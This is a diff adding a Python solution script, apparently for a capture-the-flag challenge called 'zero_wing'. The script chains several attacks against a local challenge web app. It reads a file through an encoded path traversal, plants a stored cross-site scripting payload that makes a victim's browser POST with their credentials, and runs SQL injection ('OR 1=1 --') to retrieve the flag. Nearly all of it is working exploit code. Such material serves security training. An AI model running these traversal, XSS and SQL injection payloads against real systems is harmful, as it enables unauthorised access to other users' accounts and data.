@@ -1,0 +1,76 @@
+hacker@ptsqlixss~zero-wing:~$ cat zero_wing_solution 
+#!/usr/bin/env python
+
+from pwn import *
+import time
+from urllib.parse import quote
+
+
+server = process("/challenge/the_hangout")
+print("starting server...")
+time.sleep(3)
+
+
+def encode_path(target):
+    payload = ''.join(chr((ord(c) - 0x42) % 0x100) for c in target[::-1])
+    return quote(payload, safe='')
+
+note_path = encode_path("../strange_note")
+
+
+read_note = process(["curl", f"http://challenge.localhost:365/tables/{note_path}"])
+note = read_note.recvall(timeout=3).decode()
+
+evil_user = note.split()[-1]
+print(f"evil_user: {evil_user}")
+
+
+with open("/tmp/table", "w") as file:
+    file.write('<script>fetch("/make_table_public",{method:"POST",credentials:"include"})</script>')
+
+process(["/challenge/set_table", "/tmp/table"])
+print("setting table")
+time.sleep(5)
+
+
+print("inviting evil_user (this takes awhile!")
+invite = process(["/challenge/invite", evil_user])
+
+time.sleep(10)
+
+t = invite.recvuntil("leave")
+print(t.decode())
+invite.sendline("3")
+t = invite.recvuntil("leave")
+print(t.decode())
+invite.sendline("0")
+t = invite.recv()
+print(t.decode())
+
+
+print("looking for evil_user table")
+process([
+    "curl", "-c", "c", "-X", "POST",
+    "http://challenge.localhost:365/login",
+    "--data-urlencode", "identification=Tyler"
+]).recvall(timeout=3)
+
+tables = process([
+    "curl", "-b", "c",
+    "http://challenge.localhost:365/look_for_tables"
+]).recvall(timeout=3).decode(errors="ignore")
+
+m = re.search(r"Table: ([a-z]{8}), Leader: " + evil_user, tables)
+table = m.group(1)
+print("table:", table)
+
+flag_page = process([
+    "curl", "-b", "c", "-X", "POST",
+    "http://challenge.localhost:365/change_keepsake",
+    "--data-urlencode", f"leader={evil_user}",
+    "--data-urlencode", f"table={table}",
+    "--data-urlencode", "curkeep=keepsake OR 1=1 --",
+    "--data-urlencode", "newkeep=keepsake"
+]).recvall(timeout=3).decode(errors="ignore")
+
+print(flag_page)
